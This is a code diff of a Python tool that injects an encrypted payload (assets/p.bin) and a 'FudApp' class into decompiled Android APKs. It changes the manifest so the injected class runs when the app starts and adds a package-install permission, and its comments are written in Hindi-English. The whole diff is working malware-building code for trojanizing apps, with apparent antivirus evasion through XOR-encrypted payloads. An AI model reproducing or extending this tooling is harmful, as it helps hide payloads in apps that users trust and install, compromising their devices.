@@ -1,12 +1,13 @@
 """
-Class2.dex (Loader+FudApp) + assets/p.bin inject karta hai.
-Native lib NAHI — pure Java XOR decrypt.
+Class2.dex (FudApp) + assets/p.bin inject karta hai.
+Native lib nahi — pure Java XOR decrypt.
+FudApp ke andar hi saara logic hai, koi alag Loader.java nahi.
 """
 import os
 import shutil
 import zipfile
 import xml.etree.ElementTree as ET
-from config import LOADER_SRC_DIR, LOADER_DEX
+from config import LOADER_SRC_DIR
 from setup import _compile_dex, _FUD_APP_TEMPLATE
 
 ANDROID_NS = "http://schemas.android.com/apk/res/android"
@@ -31,24 +32,32 @@ def _patch_manifest(decompiled_dir: str):
     path = os.path.join(decompiled_dir, "AndroidManifest.xml")
     tree = ET.parse(path)
     root = tree.getroot()
+
+    # REQUEST_INSTALL_PACKAGES add karo — API 26+ pe install launch ke liye chahiye
+    has_perm = False
+    for pm in root.findall("uses-permission"):
+        if pm.get(f"{{{ANDROID_NS}}}name") == "android.permission.REQUEST_INSTALL_PACKAGES":
+            has_perm = True
+            break
+    if not has_perm:
+        pm = ET.SubElement(root, "uses-permission")
+        pm.set(f"{{{ANDROID_NS}}}name", "android.permission.REQUEST_INSTALL_PACKAGES")
+
     app = root.find("application")
     if app is None:
         app = ET.SubElement(root, "application")
     app.set(f"{{{ANDROID_NS}}}name", "com.system.fud.FudApp")
+
     tree.write(path, encoding="utf-8", xml_declaration=True)
-    print("[✓] manifest → com.system.fud.FudApp")
+    print("[✓] manifest → com.system.fud.FudApp + REQUEST_INSTALL_PACKAGES")
 
 
 def _build_fud_app_dex(original_class: str, out_dex: str):
-    """FudApp per-APK compile. Loader + FudApp together."""
-    src_dir = LOADER_SRC_DIR + "_app"
+    """FudApp per-APK compile — superclass replaced with original Application."""
+    src_dir = LOADER_SRC_DIR
     if os.path.exists(src_dir):
         shutil.rmtree(src_dir)
     os.makedirs(src_dir, exist_ok=True)
-
-    # copy cached Loader.java
-    shutil.copy2(os.path.join(LOADER_SRC_DIR, "Loader.java"),
-                 os.path.join(src_dir, "Loader.java"))
 
     with open(os.path.join(src_dir, "FudApp.java"), "w") as f:
         f.write(_FUD_APP_TEMPLATE.replace("{SUPER}", original_class))
